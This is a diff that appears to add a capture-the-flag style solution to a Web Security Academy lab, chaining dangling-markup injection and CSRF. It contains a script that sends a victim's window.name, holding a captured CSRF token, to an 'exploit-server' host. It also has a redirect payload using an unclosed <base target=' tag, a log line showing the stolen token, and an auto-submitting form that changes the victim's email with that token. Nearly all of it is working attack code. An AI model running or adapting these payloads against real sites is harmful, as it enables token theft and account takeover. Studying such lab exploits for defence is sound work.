@@ -1,0 +1,36 @@
+// Deliver the following script to victim
+<script>
+if(window.name) {
+    new Image().src='//exploit-server?'+encodeURIComponent(window.name);
+    } else {
+        location = 'https://lab-id.net/email?email="><a href="http://exploit-server/exploit">Click me</a><base target='';
+}
+</script>
+	// - When victim run the script for 1st time, window.name not set, will be redirected to /email page with our payload
+	// - <base> specifies the base URL and/or target for all relative URLs in a document.
+	// - <base target=' captures the CSRF token and set it as new window's name
+	// - When victim click on "Click me", will be visiting attacker-controlled site with window name set to CSRF token value due to <base> target attribute.
+
+// CSRF token retrieved
+172.31.31.121   2020-05-22 04:20:28  0000 "GET /?">
+                            <input required type="hidden" name="csrf" value="w7dIh6TGx5lSWM8D4LllPYZxCWIgWuSs">
+                            <button class= HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36"
+
+
+
+
+// Deliver the following HTML form to victim to trigger CSRF with stolen CSRF token
+<html>
+<body>
+<script>history.pushState('','','/')</script>
+<form action="https://aca61fc01fd7792f809cbb4b003d00fd.web-security-academy.net/email/change-email" method="POST">
+<input type="hidden" name="email" value="kiddie&#64;test&#46;com">
+<input type="hidden" name="csrf" value="w7dIh6TGx5lSWM8D4LllPYZxCWIgWuSs">
+<input type="submit" value="Submit request">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+</body>                   
+</html>
+
